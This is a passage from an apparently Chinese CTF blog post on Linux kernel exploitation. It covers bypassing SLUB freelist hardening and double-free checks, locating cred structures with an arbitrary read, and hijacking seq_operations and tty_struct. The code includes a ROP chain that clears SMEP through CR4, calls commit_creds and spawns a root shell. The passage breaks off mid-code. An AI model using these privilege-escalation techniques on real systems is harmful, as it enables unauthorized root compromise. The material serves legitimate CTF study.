<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swab(kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br></pre></td></tr></table></div></figure>

<p>本质上是大小端互换，比如</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> before = <span class="number">0xaabbccdd</span>;</span><br><span class="line"><span class="keyword">int</span> after = swab(before);</span><br><span class="line">after == <span class="number">0xddccbbaa</span>;</span><br></pre></td></tr></table></div></figure>

<p>这个直接解，参照哪个师傅的来着，忘记了…..</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __u64 u_int64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swab64(x) ((__u64)((((__u64)(x) &amp; (__u64)0x00000000000000ffULL) &lt;&lt; 56) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000000000ff00ULL) &lt;&lt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000000000ff0000ULL) &lt;&lt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00000000ff000000ULL) &lt;&lt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000ff00000000ULL) &gt;&gt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000ff0000000000ULL) &gt;&gt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00ff000000000000ULL) &gt;&gt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0xff00000000000000ULL) &gt;&gt; 56)))</span></span><br></pre></td></tr></table></div></figure>

<p>然后又不知道从哪个版本开始，FD的存放位置发生改变，放在了chunk_addr+(size/2)的位置上，以0x80大小的chunk为例子(反正v5.0没有，v5.7有)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png" alt="image-20220117105059115"></p>
<p>此外计算方式也有点变化，ptr_addr不再是当前chunk的地址，而是FD的地址，同时还是会与上面的运算做一个简单的合并:</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr) ^ next_chunk_addr</span><br></pre></td></tr></table></div></figure>

<p>所以当我们本地把random值测出来之后，再依据freelist的最后一个直接改next_addr然后套入上述公式，获得FD值，将FD值写入即可完成上述任意堆块申请。（但是远程还没有试过，想来依据最近的easy_kernel中测出来的情况应该是random值也是不变的）</p>
<p>同样的当位于freelist的最后一个chunk时，next_chunk_addr = 0，上述公式就变成如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr)</span><br></pre></td></tr></table></div></figure>

<p>进而可以测出FD_addr，得到chunk的地址。当然，前提是建立在远程的random值不会发生改变。</p>
<p>如果远程的random值会发生改变的话，那么直接将当前FD_value异或需要劫持的fake_chunk_addr，那么一直将freelist申请完，之后再接着申请就能得到fake_chunk_addr。这种情况我们可以借助连续的两个FD_value中间4个字节是否发生改变来进行判断，如果改变了，那么代表freelist即将结束，这时候就可以进行修改了。不过修改之后，该size的<code>kmem_cache</code>的freelist链表就会损坏，要么重新修复，要么就申请其他size的<code>kmem_cache</code>。</p>
<p>但是还有一个问题就是，如果开了下面的<code>RANDOM</code>保护，那么我们测出来的random值其实就不一定准确了，因为freelist中的chunk地址不是连续的，我们用连续的地址来测势必导致测出来的random值的低2个字节不同，这时候就需要申请到freelist的最后一个chunk，取得其FD值的低2个字节和我们之前测出来的random一合并就是最终的random值了。不过这个怎么判断是freelist的最后一个chunk也有点问题…</p>

        <h5 id="double-free"   >
          <a href="#double-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h5>
      <p>在开启了HARDENED这种情况下，对于FD指针会添加一个检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mm/slub.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object, <span class="keyword">void</span> *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>检测double_free，其实就相当于是fastbin中的double_free检测，检测freelist中的第一个和即将放进入freelist中的chunk是否相等。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png" alt="image-20220308235157003"></p>
<p>所以同理可得，也可以说如下，在中间加入一个chunk的free即可绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free chunk1</span><br><span class="line">free chunk2</span><br><span class="line">free chunk1</span><br></pre></td></tr></table></div></figure>

<p>但是在内核环境下，啥时候都可能碰到申请chunk，所以有时候可能再申请的时候不能成功申请到chunk1-&gt;chunk2-&gt;chunk1的顺序</p>
<p>这时候如果最好还是绑定到一个CPU上</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 绑定到一个cpu上</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cpu_mask = <span class="number">0x01</span>;</span><br><span class="line">sched_setaffinity(<span class="number">0</span>, <span class="number">1</span>, &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>




        <h4 id="3-RANDOM保护"   >
          <a href="#3-RANDOM保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-RANDOM保护" class="headerlink" title="(3)RANDOM保护"></a>(3)RANDOM保护</h4>
      <p>在v4.7及之后存在，编译内核时加入<code>CONFIG_SLAB_FREELIST_RANDOM=y</code>选项，会启用<code>Fisher-Yates</code>随机排列算法打乱freelist的顺序</p>
<p>这个情况下每次更新freelist的时候，会打乱freelist中空闲的chunk，造成无法简单申请到指定的chunk，不过我们可以修改FD之后，多次申请，也可以申请到修改之后的chunk。</p>
<p>也是参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="借助prctl函数寻找cred地址"   >
          <a href="#借助prctl函数寻找cred地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助prctl函数寻找cred地址" class="headerlink" title="借助prctl函数寻找cred地址"></a>借助prctl函数寻找cred地址</h3>
      <p>🔺注：需要存在任意读</p>
<p>prctl函数的PR_SET_NAME功能可以设置task_struct结构体中的comm[TASK_COMM_LEN]成员。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">&quot;tryToFindPIG007&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME,target);</span><br></pre></td></tr></table></div></figure>

<p>然后内存搜索定位</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//search target chr</span></span><br><span class="line"><span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any memory&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">    result=memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (result)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;result:%p\n&quot;</span>,result);</span><br><span class="line">        cred= * (<span class="keyword">size_t</span> *)(result<span class="number">-0x8</span>);</span><br><span class="line">        real_cred= *(<span class="keyword">size_t</span> *)(result<span class="number">-0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ((cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">        &#123;</span><br><span class="line">            target_addr=addr+result-(<span class="keyword">int</span>)(buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>之后再借用任意写或者修改FD申请来修改cred结构中的内容即可。</p>

        <h3 id="借助stat设备修改函数指针"   >
          <a href="#借助stat设备修改函数指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助stat设备修改函数指针" class="headerlink" title="借助stat设备修改函数指针"></a>借助stat设备修改函数指针</h3>
      <p>原理就是劫持<code>seq_operations</code>结构体的函数指针，进而控制程序流。</p>
<p>西湖论剑–easy_kernel</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>有如下结构体，大小为0x20，当我们可以申请0x20大小的Chunk，然后释放，再打开<code>/proc/self/stat</code>设备就可以得到该结构体。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如果存在UAF之类的就可以从里面读取函数偏移，获得kernel基地址，然后还可以修改里面的start函数指针，劫持使其指向我们的gadget，当我们对该设备进行读取操作时，就会调用该start指针，从而进入到我们劫持的gadget，进而可以程序控制执行流。使用如下汇编进行对该设备的操作。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>劫持之后再需要getshell就需要注意另一个结构体了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>当我们调用syscall的时候，会将以上寄存器压入内核栈中，然后形成如上的结构，即如下汇编所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x400db8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, user_rflags;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>如上的汇编会在内核栈中形成如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png" alt="image-20220115110535050"></p>
<p>所以如果借助<code>add_rsp xx;pop_ret</code>这类指令，就可以将我们的控制流的栈拉高到我们可控数据范围，进而劫持栈。使用<code>commit(cred)</code>提权（这里的提权因为无法控制rdi，所以就借助<code>init_cred</code>来提权）。提权之后借助<code>swapgs_restore_regs_and_return_to_usermode</code>函数中的pop系列来调整栈，即借用了几个栈的位置，就得少几个pop，如图借用了5个栈数据，那么我们最后就得使得该函数少pop5个，即将swapgs_restore_regs_and_return_to_usermode函数的gadget+=9即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode += <span class="number">9</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png" alt="image-20220115113005162"></p>
<p>如上修改之后就可以当进入到该函数的swapgs的时候，将栈调整至最开始因为syscall而形成的保存pt_regs结构体中的用户态数据的地方，使得提权之后成功返回用户态</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">//.....................</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>所示栈如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png" alt="image-20220115113622350"></p>
<p>使用此种方法时一般可以先设置一些标志性数据，“AAAAAA”在栈上，然后搜寻即可，以此来寻找调栈所用的gadget。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x6565656565;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>然后在某个地址范围进行搜索，就能找到该结构体的位置，好像只能是peda比较好用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;AAAAAA&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>


        <h3 id="借助ptmx设备-tty-struct"   >
          <a href="#借助ptmx设备-tty-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助ptmx设备-tty-struct" class="headerlink" title="借助ptmx设备(tty_struct)"></a>借助ptmx设备(tty_struct)</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64`-&gt;`SyS_write`-&gt;`SYSC_write`-&gt;`vfs_write`</span><br><span class="line">-&gt;`__vfs_write`-&gt;`tty_write`-&gt;`do_tty_write`-&gt;`n_tty_write`-&gt;`pty_write`</span><br></pre></td></tr></table></div></figure>

<p>原理就是劫持<code>tty_struct</code>结构体中的<code>const struct tty_operations *ops</code>结构体指针，然后再修改<code>fake_tty_operations</code>结构体中的<code>pty_write</code>函数指针，通过对该设备进行写操作进而调用劫持的函数指针，控制执行流程。</p>
<p>同时在调用的时候rax为从劫持的tty_struct结构体中获取的<code>operations *ops</code>指针，该指针可以被我们修改劫持。之后借助一个对rax和rsp进行操作的<code>gadget--movRspRax_decEbx_ret</code>进而劫持栈，完成程序流和栈的劫持。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fake_tty_operations[i] = movRspRax_decEbx_ret;</span><br><span class="line">&#125;</span><br><span class="line">fake_tty_operations[<span class="number">0</span>] = pop_rax_rbx_r12_r13_rbp_ret;</span><br><span class="line">fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">fake_tty_struct[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>;<span class="comment">//need to set magic number</span></span><br><span class="line">fake_tty_struct[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// pop_rax_rbx_r12_rbp_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;      <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret;      <span class="comment">// swapgs;ret</span></span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span 